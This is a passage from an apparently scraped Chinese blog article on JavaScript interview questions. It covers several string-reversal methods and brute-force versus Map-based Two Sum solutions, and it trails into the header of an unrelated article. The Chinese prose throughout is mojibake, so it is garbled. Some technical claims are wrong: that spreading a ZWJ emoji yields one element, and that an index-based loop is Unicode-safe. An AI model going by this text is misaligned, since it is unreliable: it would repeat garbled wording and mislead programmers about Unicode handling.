ç†Ÿç»ƒåº¦ä¸ç®—æ³•æ„è¯†</strong> çš„ç»å…¸ç»„åˆæ‹³ã€‚æœ¬æ–‡å°†å¸¦ä½ ï¼š</p>
<ul>
<li>ç”¨Â <strong>5 ç§æ–¹å¼å®ç°å­—ç¬¦ä¸²åè½¬</strong>ï¼Œå¯¹æ¯”ä¼˜åŠ£ï¼›</li>
<li>æ·±å…¥å‰–æÂ <strong>ä¸¤æ•°ä¹‹å’Œçš„æš´åŠ›è§£ vs å“ˆå¸Œä¼˜åŒ–</strong>ï¼›</li>
<li>æ­ç§˜é¢è¯•å®˜çœŸæ­£æƒ³è€ƒå¯Ÿä»€ä¹ˆï¼›</li>
<li>æä¾›å¯ç›´æ¥å¤ç”¨çš„é«˜è´¨é‡ä»£ç æ¨¡æ¿ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-0">ğŸ”„ ä¸€ã€å­—ç¬¦ä¸²åè½¬ï¼šä¸æ­¢ä¸€ç§å†™æ³•</h2>
<h3 data-id="heading-1">åœºæ™¯</h3>
<p>è¾“å…¥ <code>'hello'</code>ï¼Œè¾“å‡º <code>'olleh'</code>ã€‚</p>
<blockquote>
<p>ğŸ’¡ é¢è¯•å®˜å…³æ³¨ç‚¹ï¼š</p>
<ul>
<li>æ˜¯å¦ç†Ÿæ‚‰æ•°ç»„/å­—ç¬¦ä¸² APIï¼ˆ<code>split</code>,Â <code>reverse</code>,Â <code>join</code>ï¼‰</li>
<li>èƒ½å¦å†™å‡ºæ¸…æ™°ã€å¥å£®çš„å¾ªç¯é€»è¾‘</li>
<li>æ˜¯å¦ç†è§£é€’å½’æ€æƒ³åŠå…¶é£é™©</li>
<li>æ˜¯å¦ä¼šç”¨ç°ä»£è¯­æ³•ï¼ˆå¦‚æ‰©å±•è¿ç®—ç¬¦ã€reduceï¼‰</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-2">âœ… æ–¹æ³•1ï¼šç»å…¸ä¸‰è¿ï¼ˆAPI æµï¼‰</h3>
<pre><code class="hljs language-perl" lang="perl">js
ç¼–è¾‘
function reverseStr(str) {
  <span class="hljs-keyword">return</span> str.<span class="hljs-keyword">split</span>(<span class="hljs-string">''</span>).<span class="hljs-keyword">reverse</span>().join(<span class="hljs-string">''</span>);
}

const str = <span class="hljs-string">"hello"</span>; 
const arr = str.<span class="hljs-keyword">split</span>(<span class="hljs-string">''</span>); 
<span class="hljs-regexp">//</span> arr çš„å€¼ä¼šæ˜¯ï¼š[<span class="hljs-string">'h'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'o'</span>]

const arr = [<span class="hljs-string">'h'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'o'</span>];
arr.<span class="hljs-keyword">reverse</span>(); 
<span class="hljs-regexp">//</span> è°ƒç”¨åï¼Œarr æœ¬èº«è¢«ä¿®æ”¹äº†ï¼Œç°åœ¨çš„å€¼æ˜¯ï¼š[<span class="hljs-string">'o'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'h'</span>]

const reversedArr = [<span class="hljs-string">'o'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'h'</span>]; 
const reversedStr = reversedArr.join(<span class="hljs-string">''</span>); 
<span class="hljs-regexp">//</span> reversedStr çš„å€¼ä¼šæ˜¯ï¼š<span class="hljs-string">"olleh"</span>
</code></pre>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šç®€æ´ã€å¯è¯»æ€§å¼ºï¼Œä½“ç°å¯¹å†…ç½®æ–¹æ³•çš„æŒæ¡ã€‚</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šåˆ›å»ºä¸­é—´æ•°ç»„ï¼Œå†…å­˜å¼€é”€ç•¥é«˜ï¼ˆä½†é€šå¸¸å¯å¿½ç•¥ï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-3">âœ… æ–¹æ³•2ï¼šä¼ ç»Ÿ for å¾ªç¯ï¼ˆä»åå¾€å‰ï¼‰</h3>
<pre><code class="hljs language-ini" lang="ini">js
ç¼–è¾‘
function reverseStr(str) {
  let <span class="hljs-attr">reversed</span> = <span class="hljs-string">''</span><span class="hljs-comment">;</span>
  for (let <span class="hljs-attr">i</span> = str.length - <span class="hljs-number">1</span><span class="hljs-comment">; i &gt;= 0; i--) {</span>
    reversed += str<span class="hljs-section">[i]</span><span class="hljs-comment">;</span>
  }
  return reversed<span class="hljs-comment">;</span>
}
</code></pre>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šé€»è¾‘ç›´è§‚ï¼Œå…¼å®¹æ€§å¥½ï¼ˆES3 èµ·æ”¯æŒï¼‰ã€‚</li>
<li><strong>æ³¨æ„</strong>ï¼šå­—ç¬¦ä¸²æ‹¼æ¥åœ¨æ—§å¼•æ“ä¸­å¯èƒ½ä½æ•ˆï¼ˆç°ä»£ V8 å·²ä¼˜åŒ–ï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-4">âœ… æ–¹æ³•3ï¼šfor...of åå‘æ‹¼æ¥</h3>
<pre><code class="hljs language-csharp" lang="csharp">js
ç¼–è¾‘
<span class="hljs-function">function <span class="hljs-title">reverseStr</span>(<span class="hljs-params">str</span>)</span> {
  <span class="hljs-keyword">let</span> reversed = <span class="hljs-string">''</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> of str) {
    reversed = <span class="hljs-built_in">char</span> + reversed; <span class="hljs-comment">// æ¯æ¬¡æŠŠæ–°å­—ç¬¦æ”¾å‰é¢</span>
  }
  <span class="hljs-keyword">return</span> reversed;
}
</code></pre>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šé¿å…ç´¢å¼•æ“ä½œï¼Œæ›´ç¬¦åˆâ€œéå†å­—ç¬¦â€è¯­ä¹‰ã€‚</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šé¢‘ç¹å­—ç¬¦ä¸²æ‹¼æ¥ï¼ˆè™½ç°ä»£ JS å¼•æ“å·²ä¼˜åŒ–ï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-5">âœ… æ–¹æ³•4ï¼šæ‰©å±•è¿ç®—ç¬¦ + æ•°ç»„æ–¹æ³•ï¼ˆES6+ï¼‰</h3>
<pre><code class="hljs language-python" lang="python">js
ç¼–è¾‘
function reverseStr(<span class="hljs-built_in">str</span>) {
  <span class="hljs-keyword">return</span> [...<span class="hljs-built_in">str</span>].reverse().join(<span class="hljs-string">''</span>);
}

const <span class="hljs-built_in">str</span> = <span class="hljs-string">"hello"</span>; const arr = [...<span class="hljs-built_in">str</span>]; 
// arr çš„å€¼ä¼šæ˜¯ï¼š[<span class="hljs-string">'h'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'o'</span>]
</code></pre>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šæ¯”Â <code>split('')</code>Â æ›´ä¼˜é›…ï¼ˆå°¤å…¶å¯¹ emoji/Unicode æ”¯æŒæ›´å¥½ï¼‰ã€‚</li>
<li><strong>åŸç†</strong>ï¼š<code>[...str]</code>Â èƒ½æ­£ç¡®å¤„ç† UTF-16 ä»£ç†å¯¹ï¼ˆå¦‚Â <code>'ğŸ‘¨â€ğŸ’»'.length === 5</code>ï¼Œä½†Â <code>[...'ğŸ‘¨â€ğŸ’»'].length === 1</code>ï¼‰ã€‚</li>
</ul>
<blockquote>
<p>ğŸŒ° å¯¹æ¯”ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">js
ç¼–è¾‘
<span class="hljs-string">'cafÃ©'</span>.<span class="hljs-built_in">split</span>(<span class="hljs-string">''</span>)   // [<span class="hljs-string">'c'</span>,<span class="hljs-string">'a'</span>,<span class="hljs-string">'f'</span>,<span class="hljs-string">'Ã©'</span>] âœ…
<span class="hljs-string">'ğŸ‘¨â€ğŸ’»'</span>.<span class="hljs-built_in">split</span>(<span class="hljs-string">''</span>)    // [<span class="hljs-string">'ğŸ‘¨'</span>, <span class="hljs-string">'â€'</span>, <span class="hljs-string">'ğŸ’»'</span>] âŒ
[...<span class="hljs-string">'ğŸ‘¨â€ğŸ’»'</span>]         // [<span class="hljs-string">'ğŸ‘¨â€ğŸ’»'</span>] âœ…
</code></pre>
</blockquote>
<hr/>
<h3 data-id="heading-6">âœ… æ–¹æ³•5ï¼šé€’å½’å®ç°ï¼ˆå±•ç¤ºæ€ç»´ï¼‰</h3>
<pre><code class="hljs language-rust" lang="rust">js
ç¼–è¾‘
function <span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-type">str</span>) {
  <span class="hljs-title function_ invoke__">if</span> (<span class="hljs-type">str</span> === '') <span class="hljs-keyword">return</span> ''; <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-type">str</span>.<span class="hljs-title function_ invoke__">substring</span>(<span class="hljs-number">1</span>)) + <span class="hljs-type">str</span>.<span class="hljs-title function_ invoke__">charAt</span>(<span class="hljs-number">0</span>);
}

<span class="hljs-keyword">const</span> <span class="hljs-type">str</span> = <span class="hljs-string">"hello"</span>; 
<span class="hljs-keyword">const</span> subStr = <span class="hljs-type">str</span>.<span class="hljs-title function_ invoke__">substring</span>(<span class="hljs-number">1</span>); 
<span class="hljs-comment">// subStr çš„å€¼ä¼šæ˜¯ï¼š"ello" (ä»ç´¢å¼•1çš„ 'e' å¼€å§‹åˆ°æœ«å°¾)</span>

<span class="hljs-keyword">const</span> <span class="hljs-type">str</span> = <span class="hljs-string">"hello"</span>; 
<span class="hljs-keyword">const</span> firstChar = <span class="hljs-type">str</span>.<span class="hljs-title function_ invoke__">charAt</span>(<span class="hljs-number">0</span>); 
<span class="hljs-comment">// firstChar çš„å€¼ä¼šæ˜¯ï¼š"h" (ç´¢å¼•0ä½ç½®çš„å­—ç¬¦)</span>

<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"hello"</span>)`Â è°ƒç”¨Â `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"ello"</span>)`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"ello"</span>)`Â è°ƒç”¨Â `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"llo"</span>)`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"llo"</span>)`Â è°ƒç”¨Â `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"lo"</span>)`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"lo"</span>)`Â è°ƒç”¨Â `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"o"</span>)`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"o"</span>)`Â è°ƒç”¨Â `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">""</span>)`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">""</span>)`Â è§¦å‘ç»ˆæ­¢æ¡ä»¶ï¼Œè¿”å›Â `<span class="hljs-string">""</span>`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"o"</span>)`Â å¾—åˆ°è¿”å›å€¼Â `<span class="hljs-string">""</span> + <span class="hljs-string">"o"</span>`ï¼Œå³Â `<span class="hljs-string">"o"</span>`ï¼Œå¹¶è¿”å›
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"lo"</span>)`Â å¾—åˆ°è¿”å›å€¼Â `<span class="hljs-string">"o"</span> + <span class="hljs-string">"l"</span>`ï¼Œå³Â `<span class="hljs-string">"ol"</span>`ï¼Œå¹¶è¿”å›
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"llo"</span>)`Â å¾—åˆ°è¿”å›å€¼Â `<span class="hljs-string">"ol"</span> + <span class="hljs-string">"l"</span>`ï¼Œå³Â `<span class="hljs-string">"oll"</span>`ï¼Œå¹¶è¿”å›
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"ello"</span>)`Â å¾—åˆ°è¿”å›å€¼Â `<span class="hljs-string">"oll"</span> + <span class="hljs-string">"e"</span>`ï¼Œå³Â `<span class="hljs-string">"olle"</span>`ï¼Œå¹¶è¿”å›
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"hello"</span>)`Â å¾—åˆ°è¿”å›å€¼Â `<span class="hljs-string">"olle"</span> + <span class="hljs-string">"h"</span>`ï¼Œå³Â `<span class="hljs-string">"olleh"</span>`ï¼Œå¹¶è¿”å›ç»™æœ€åˆçš„è°ƒç”¨è€…
</code></pre>
<ul>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼šä½“ç°åˆ†æ²»æ€æƒ³ï¼Œä»£ç ç®€æ´ã€‚</p>
</li>
<li>
<p><strong>âš ï¸ é£é™©</strong>ï¼š</p>
<ul>
<li><strong>çˆ†æ ˆ</strong>ï¼šé•¿å­—ç¬¦ä¸²ï¼ˆå¦‚ &gt;10,000 å­—ç¬¦ï¼‰ä¼šå¯¼è‡´æ ˆæº¢å‡ºï¼›</li>
<li><strong>æ€§èƒ½å·®</strong>ï¼šæ¯æ¬¡Â <code>substring</code>Â éƒ½åˆ›å»ºæ–°å­—ç¬¦ä¸²ï¼Œæ—¶é—´å¤æ‚åº¦ O(nÂ²)ã€‚</li>
</ul>
</li>
</ul>
<blockquote>
<p>ğŸš« <strong>ä¸æ¨èç”Ÿäº§ä½¿ç”¨</strong>ï¼Œä½†é¢è¯•å¯ä½œä¸ºâ€œå±•ç¤ºé€’å½’ç†è§£â€çš„å¤‡é€‰ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-7">âœ… æ–¹æ³•6ï¼šreduce é«˜é˜¶å‡½æ•°ï¼ˆå‡½æ•°å¼é£æ ¼ï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript">js
ç¼–è¾‘
<span class="hljs-keyword">function</span> <span class="hljs-title function_">reverseStr</span>(<span class="hljs-params">str</span>) {
  <span class="hljs-keyword">return</span> [...str].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">reversed, char</span>) =&gt;</span> char + reversed, <span class="hljs-string">''</span>);
}
</code></pre>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šæ— çŠ¶æ€ã€çº¯å‡½æ•°é£æ ¼ï¼Œé€‚åˆå‡½æ•°å¼ç¼–ç¨‹åœºæ™¯ã€‚</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šå¯è¯»æ€§ç•¥ä½äºä¸‰è¿ APIã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-8">ğŸ“Š åè½¬æ–¹æ³•å¯¹æ¯”æ€»ç»“</h2>






















































<table><thead><tr><th>æ–¹æ³•</th><th>å¯è¯»æ€§</th><th>æ€§èƒ½</th><th>Unicode å®‰å…¨</th><th>æ¨èåœºæ™¯</th></tr></thead><tbody><tr><td><code>split+reverse+join</code></td><td>â­â­â­â­</td><td>â­â­â­</td><td>âŒï¼ˆéƒ¨åˆ†ï¼‰</td><td>å¿«é€Ÿå®ç°</td></tr><tr><td><code>for</code>Â å¾ªç¯</td><td>â­â­â­</td><td>â­â­â­â­</td><td>âœ…</td><td>å…¼å®¹è€ç¯å¢ƒ</td></tr><tr><td><code>for...of</code></td><td>â­â­â­â­</td><td>â­â­â­</td><td>âœ…</td><td>ç°ä»£é¡¹ç›®</td></tr><tr><td><code>[...str]</code></td><td>â­â­â­â­â­</td><td>â­â­â­</td><td>âœ…âœ…</td><td><strong>é¦–é€‰æ¨è</strong></td></tr><tr><td>é€’å½’</td><td>â­â­</td><td>â­</td><td>âœ…</td><td>é¢è¯•å±•ç¤º</td></tr><tr><td><code>reduce</code></td><td>â­â­â­</td><td>â­â­</td><td>âœ…</td><td>å‡½æ•°å¼åå¥½</td></tr></tbody></table>
<blockquote>
<p>âœ… <strong>æœ€ä½³å®è·µ</strong>ï¼šæ—¥å¸¸å¼€å‘ä¼˜å…ˆç”¨ <code>[...str].reverse().join('')</code>ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-9">ğŸ”¢ äºŒã€ä¸¤æ•°ä¹‹å’Œï¼šä»æš´åŠ›åˆ°å“ˆå¸Œä¼˜åŒ–</h2>
<blockquote>
<p><strong>é¢˜ç›®</strong>ï¼šç»™å®šæ•´æ•°æ•°ç»„ <code>nums</code> å’Œç›®æ ‡å€¼ <code>target</code>ï¼Œæ‰¾å‡ºä¸¤ä¸ªæ•°çš„ç´¢å¼•ï¼Œä½¿å…¶å’Œç­‰äº <code>target</code>ã€‚å‡è®¾æ¯ç»„è¾“å…¥åªæœ‰ä¸€ç»„è§£ã€‚</p>
</blockquote>
<h3 data-id="heading-10">é¢è¯•å®˜çœŸå®æ„å›¾ï¼š</h3>
<ul>
<li>è€ƒå¯ŸÂ <strong>æ—¶é—´å¤æ‚åº¦æ„è¯†</strong></li>
<li>æ˜¯å¦çŸ¥é“Â  <strong>â€œç©ºé—´æ¢æ—¶é—´â€</strong> Â æ€æƒ³</li>
<li>å¯¹Â <strong>æ•°æ®ç»“æ„é€‰æ‹©</strong>Â çš„æ•æ„Ÿåº¦ï¼ˆObject vs Mapï¼‰</li>
</ul>
<hr/>
<h3 data-id="heading-11">âŒ è§£æ³•1ï¼šæš´åŠ›åŒé‡å¾ªç¯ï¼ˆO(nÂ²)ï¼‰</h3>
<pre><code class="hljs language-ini" lang="ini">js
ç¼–è¾‘
function twoSum(nums, target) {
  for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; nums.length; i++) {</span>
    for (let <span class="hljs-attr">j</span> = i + <span class="hljs-number">1</span><span class="hljs-comment">; j &lt; nums.length; j++) {</span>
      if (nums<span class="hljs-section">[i]</span> + nums<span class="hljs-section">[j]</span> === target) {
        return <span class="hljs-section">[i, j]</span><span class="hljs-comment">;</span>
      }
    }
  }
}
</code></pre>
<ul>
<li><strong>é—®é¢˜</strong>ï¼šn=10â´ æ—¶ï¼Œæ“ä½œæ¬¡æ•°è¾¾ 5Ã—10â·ï¼Œæ˜æ˜¾è¶…æ—¶ã€‚</li>
<li><strong>ç»“è®º</strong>ï¼šä»…ç”¨äºå…œåº•æˆ–æ•™å­¦æ¼”ç¤ºã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-12">âœ… è§£æ³•2ï¼šå“ˆå¸Œè¡¨ä¼˜åŒ–ï¼ˆO(n)ï¼‰â€”â€”æ ¸å¿ƒæ€è·¯</h3>
<h4 data-id="heading-13">æ ¸å¿ƒæ€æƒ³ï¼š</h4>
<blockquote>
<p><strong>â€œæ±‚å’Œå˜æ±‚å·®â€</strong><br/>
éå†æ—¶ï¼Œè®°å½•æ¯ä¸ªæ•°å­—åŠå…¶ç´¢å¼•ï¼›<br/>
å¯¹å½“å‰ <code>num</code>ï¼Œæ£€æŸ¥ <code>target - num</code> æ˜¯å¦å·²å­˜åœ¨ã€‚</p>
</blockquote>
<h4 data-id="heading-14">æ–¹æ¡ˆAï¼šä½¿ç”¨æ™®é€šå¯¹è±¡ï¼ˆObjectï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini">js
ç¼–è¾‘
function twoSum(nums, target) {
  const <span class="hljs-attr">map</span> = {}<span class="hljs-comment">;</span>
  for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; nums.length; i++) {</span>
    const <span class="hljs-attr">complement</span> = target - nums[i]<span class="hljs-comment">;</span>
    if (map<span class="hljs-section">[complement]</span> !== undefined) {
      return <span class="hljs-section">[map[complement]</span>, i]<span class="hljs-comment">;</span>
    }
    map<span class="hljs-section">[nums[i]]</span> = i<span class="hljs-comment">;</span>
  }
}
</code></pre>
<ul>
<li><strong>é£é™©</strong>ï¼šé”®ä¸ºå­—ç¬¦ä¸²ï¼Œè‹¥Â <code>nums</code>Â å«éæ•°å­—ï¼ˆå¦‚Â <code>'2'</code>ï¼‰ï¼Œå¯èƒ½æ··æ·†ï¼›</li>
<li><strong>æ€§èƒ½</strong>ï¼šV8 å¯¹å¯¹è±¡å±æ€§è®¿é—®é«˜åº¦ä¼˜åŒ–ï¼Œå®é™…å¾ˆå¿«ã€‚</li>
</ul>
<h4 data-id="heading-15">æ–¹æ¡ˆBï¼šä½¿ç”¨Â <code>Map</code>ï¼ˆæ¨èï¼ï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini">js
ç¼–è¾‘
function twoSum(nums, target) {
  const <span class="hljs-attr">map</span> = new Map()<span class="hljs-comment">;</span>
  for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; nums.length; i++) {</span>
    const <span class="hljs-attr">complement</span> = target - nums[i]<span class="hljs-comment">;</span>
    if (map.has(complement)) {
      return <span class="hljs-section">[map.get(complement), i]</span><span class="hljs-comment">;</span>
    }
    map.set(nums<span class="hljs-section">[i]</span>, i)<span class="hljs-comment">;</span>
  }
}
</code></pre>
<ul>
<li>
<p><strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>é”®ç±»å‹ä¿æŒåŸæ ·ï¼ˆnumber è¿˜æ˜¯ numberï¼‰ï¼›</li>
<li><code>has()</code>Â /Â <code>get()</code>Â è¯­ä¹‰æ¸…æ™°ï¼›</li>
<li>é¿å…åŸå‹é“¾æ±¡æŸ“ï¼ˆå¦‚Â <code>map.__proto__</code>Â å¹²æ‰°ï¼‰ï¼›</li>
<li>æ›´ç¬¦åˆâ€œé”®å€¼å¯¹å®¹å™¨â€è¯­ä¹‰ã€‚</li>
</ul>
</li>
</ul>
<blockquote>
<p>ğŸ“Œ <strong>é¢è¯•åŠ åˆ†ç‚¹</strong>ï¼šä¸»åŠ¨è¯´å‡º â€œæˆ‘é€‰æ‹© <code>Map</code> è€Œéå¯¹è±¡ï¼Œå› ä¸ºâ€¦â€¦â€</p>
</blockquote>
<hr/>
<h2 data-id="heading-16">ğŸ§  ä¸‰ã€é¢è¯•å®˜åˆ°åº•æƒ³è€ƒä»€ä¹ˆï¼Ÿ</h2>




















<table><thead><tr><th>é¢˜ç›®</th><th>è€ƒå¯Ÿç»´åº¦</th><th>é«˜åˆ†å›ç­”è¦ç‚¹</th></tr></thead><tbody><tr><td>å­—ç¬¦ä¸²åè½¬</td><td>- API ç†Ÿç»ƒåº¦ - ä»£ç é£æ ¼ - è¾¹ç•Œæ„è¯†</td><td>â€œæˆ‘ä¼šä¼˜å…ˆç”¨Â <code>[...str]</code>Â å› ä¸ºå®ƒå¯¹ Unicode æ›´å®‰å…¨â€</td></tr><tr><td>ä¸¤æ•°ä¹‹å’Œ</td><td>- ç®—æ³•æ€ç»´ - æ•°æ®ç»“æ„é€‰æ‹© - å¤æ‚åº¦åˆ†æ</td><td>â€œæš´åŠ›æ˜¯ O(nÂ²)ï¼Œæˆ‘ç”¨å“ˆå¸Œè¡¨é™åˆ° O(n)ï¼Œç©ºé—´æ¢æ—¶é—´â€</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ <strong>é¿å‘æç¤º</strong>ï¼š</p>
<ul>
<li>ä¸è¦ä¸€ä¸Šæ¥å°±å†™é€’å½’ï¼ˆé™¤éè¢«è¦æ±‚ï¼‰ï¼›</li>
<li>ä¸è¦è¯´â€œObject å’Œ Map ä¸€æ ·â€ï¼ˆæš´éœ²åŸºç¡€ä¸ç‰¢ï¼‰ï¼›</li>
<li>è®°å¾—å¤„ç†è¾¹ç•Œï¼ˆå¦‚ç©ºå­—ç¬¦ä¸²ã€æ— è§£æƒ…å†µï¼‰ã€‚</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-17">ğŸ“Œ å››ã€æ€»ç»“ &amp; å¤ä¹ æ¸…å•</h2>
<h3 data-id="heading-18">âœ… å­—ç¬¦ä¸²åè½¬</h3>
<ul>
<li><strong>é¦–é€‰å†™æ³•</strong>ï¼š<code>[...str].reverse().join('')</code></li>
<li><strong>æ…ç”¨é€’å½’</strong>ï¼šæœ‰çˆ†æ ˆé£é™©ï¼Œæ€§èƒ½å·®</li>
<li><strong>æ³¨æ„ Unicode</strong>ï¼š<code>split('')</code>Â å¯¹ emoji ä¸å‹å¥½</li>
</ul>
<h3 data-id="heading-19">âœ… ä¸¤æ•°ä¹‹å’Œ</h3>
<ul>
<li><strong>æœ€ä¼˜è§£</strong>ï¼š<code>Map</code>Â + ä¸€æ¬¡éå†ï¼ŒO(n) æ—¶é—´</li>
<li><strong>å…³é”®è½¬æ¢</strong>ï¼š<code>a + b = target</code>Â â†’Â <code>b = target - a</code></li>
<li><strong>ä¸è¦ç”¨ Object å½“å“ˆå¸Œè¡¨</strong>ï¼ˆé™¤éæ˜ç¡®çŸ¥é“æ•°æ®å®‰å…¨ï¼‰</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JSAPIThree UI æ§ä»¶å­¦ä¹ ç¬”è®°ï¼šç”¨å†…ç½®æ§ä»¶æå‡äº¤äº’]]></title>    <link>https://juejin.cn/post/7576928016901455882</link>    <guid>https://juejin.cn/post/7576928016901455882</guid>    <pubDate>2025-11-27T06:23:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576928016901455882" data-draft-id="7576978338754658354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JSAPIThree UI æ§ä»¶å­¦ä¹ ç¬”è®°ï¼šç”¨å†…ç½®æ§ä»¶æå‡äº¤äº’"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-11-27T06:23:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·296541275917"/> <meta itemprop="url" content="https://juejin.cn/user/4109293389357897"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JSAPIThree UI æ§ä»¶å­¦ä¹ ç¬”è®°ï¼šç”¨å†…ç½®æ§ä»¶æå‡äº¤äº’
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4109293389357897/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·296541275917
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:23:13.000Z" title="Thu Nov 27 2025 06:23:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
